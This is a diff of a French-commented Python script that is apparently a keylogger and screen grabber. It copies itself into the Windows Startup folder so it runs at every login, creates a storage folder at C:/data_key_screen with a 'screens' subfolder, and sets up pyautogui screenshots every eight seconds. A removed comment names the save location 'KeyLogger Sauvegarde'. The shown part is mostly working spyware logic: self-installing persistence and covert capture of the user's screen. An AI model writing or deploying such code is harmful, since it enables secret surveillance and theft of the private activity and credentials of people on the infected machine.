@@ -1,5 +1,3 @@
-
-
 import os
 import datetime
 import time
@@ -8,14 +6,12 @@ from shutil import copyfile
 
 username = os.getlogin()
 nomFichierActuelle = os.path.basename(__file__)
-print(nomFichierActuelle)
-# **** copier pour qu'il s'allume au démarrage
+
+# **** AU DEMARRAGE
 copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
 
-# ****  on va ranger ça où ? le nom du fichier ? #####
-
-#nomEmplacementSauvegarde = "G:/Mon Drive/KeyLogger Sauvegarde"
-nomEmplacementSauvegarde = "data"
+# **** EMPLACEMENT SAUVEGARDE
+nomEmplacementSauvegarde = "C:/data_key_screen"
 if not os.path.exists(nomEmplacementSauvegarde):
 	os.makedirs(nomEmplacementSauvegarde)
 
@@ -30,7 +26,7 @@ nomEmplacementSauvegarde += "/" + "screens"
 if not os.path.exists(nomEmplacementSauvegarde):
 	os.makedirs(nomEmplacementSauvegarde)
 
-# **** SCREENER
+# **** YEAH PHOTOS DE LECRAN YEAH
 intervalles_screen = 8
 import pyautogui
 
